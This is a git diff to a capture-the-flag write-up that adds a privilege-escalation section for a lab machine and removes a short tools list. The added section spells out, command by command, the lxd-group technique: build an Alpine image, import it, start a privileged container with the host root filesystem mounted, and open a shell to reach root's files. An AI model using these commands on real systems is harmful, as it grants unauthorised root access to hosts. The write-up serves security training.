@@ -523,13 +523,26 @@ ckmybrainfuckmybrainfuckmybra
 + Cat the user.txt.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a195cc6d-e538-4a25-9b12-443606396d97)
 
+## Privilege Escalation
++ Check the group of orestis: `id`
++ orestis is a member of the lxd. Check the containers: `lxc list`
++ There are no containers running, and no images available: `lxc image list`        
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6035fcb1-9906-4491-87c5-ebb6d4a08598)
 
++ Import an image.
++ Download [this repo](https://github.com/saghul/lxd-alpine-builder): https://github.com/saghul/lxd-alpine-builder on your attack machine.
++ Build it on your attack machine: `./build-alpine`
++ And transfer the file tar.gz file to the target machine.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/829bece2-deab-46f0-a874-cc351acc1df4)
 
-
-## Tools
-+ masscan
-+ nmap
-+ wpscan
++ Then run these commands:
++ `lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias image01`
++ `lxc init image01 ignite -c security.privileged=true`
++ `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
++ `lxc start ignite`
++ `lxc exec ignite /bin/sh`
++ `cd /mnt/root/root`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/51b549db-190c-4407-8854-02e2527e7cca)
 
 
 # References & Alternatives:
